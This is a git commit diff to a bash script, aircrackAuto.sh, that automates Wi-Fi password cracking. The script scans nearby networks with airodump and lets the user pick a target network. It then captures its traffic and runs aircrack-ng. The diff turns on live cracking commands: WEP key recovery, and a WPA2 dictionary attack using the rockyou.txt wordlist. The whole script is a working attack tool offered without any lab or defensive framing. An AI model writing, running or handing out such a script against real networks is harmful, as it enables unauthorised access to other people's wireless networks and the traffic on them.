4732fa60233c657fc7057bcc35abe2685cf1b11c
root <root@localhost.localdomain>
2016-05-04 19:56:03 +0000

    Aircrack is working well now

--- aircrackAuto.sh
+++ aircrackAuto.sh
@@ -8,7 +8,7 @@ iwconfig 2>/dev/null | grep -o '^[a-z0-9]\+'
 read monInterface
 echo "We gucci?(y/n)"
 read gucci
-if [[ $gucci == "n" ]]
+if [ $gucci == "n" ]
 then
 	echo "lolz"
 fi
@@ -18,7 +18,7 @@ x-terminal-emulator -e "sudo /bin/bash -c './airodump1.sh $monInterface; exec /b
 #read router
 sleep 5
 cat airodumpInfo-01.csv > usethis.csv
-cat usethis.csv | awk '/^Station MAC/{exit} {print $0}' | tail -n +3 | head -n -3 > temp.csv
+cat usethis.csv | awk '/^Station MAC/{exit} {print $0}' | tail -n +3 | head -n -3 | sort -r -n -t',' -k11 > temp.csv
 echo "Which thing do you want"
 cat temp.csv | awk -F',' '{num += 1; print num ": " $14;}' 
 read num
@@ -26,17 +26,17 @@ line=$(sed "${num}q;d" temp.csv)
 bssid=$(echo $line | cut -d ',' -f 1) #$1
 channel=$(echo $line | cut -d ',' -f 4) #$4
 encrypt=$(echo $line | cut -d ',' -f 6) #$6
-echo $encrypt
+echo $line
 x-terminal-emulator -e "sudo /bin/bash -c './airodump2.sh $monInterface $bssid $channel; exec /bin/bash -i'" #will add two more inputs to script for channel and BSSID
 echo "Press Enter to begin password cracking"
 read -s
-#if [[ $encrypt == "WEP" ]]
-#then
-#	aircrack-ng -b $bssid dump*.cap
-#fi
-if [[ $encrypt == "WPA2" ]]
+if [ $encrypt == "WEP" ]
 then
-	echo "WPA2" #aircrack-ng -w rockyou.txt -b $bssid dump*.cap
+	aircrack-ng -b $bssid dump*.cap
+fi
+if [ $encrypt = "WPA2" ]
+then
+	aircrack-ng -w rockyou.txt -b $bssid dump*.cap
 fi
 echo "Press Enter when done"
 read -s
